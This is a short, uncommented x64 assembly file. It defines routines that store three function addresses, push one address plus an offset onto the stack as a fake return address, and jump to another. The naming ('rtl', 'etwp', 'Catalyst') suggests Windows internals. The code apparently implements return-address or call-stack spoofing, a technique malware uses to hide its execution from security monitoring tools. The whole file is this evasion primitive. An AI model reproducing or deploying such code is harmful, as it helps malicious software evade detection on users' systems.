global SetWinAddrs
global Starter
section .data
  rtl dq 0
  etwp dq 0
  f dq 0

section .text
align 16
  SetWinAddrs:
    mov [rel rtl], rcx
    mov [rel etwp], rdx
    mov [rel f], r8

    ret
align 16
  Catalyst:
    mov rax, [rel rtl]
    add rax, 0xd
    push rbx
    sub rsp, 0x20
    push rax
    mov rax, [rel etwp] 
    xor ecx, ecx
    jmp rax
    ret

align 16
  Starter:
    mov rax, [rel f]
    call rax
        jmp Catalyst
    ret 





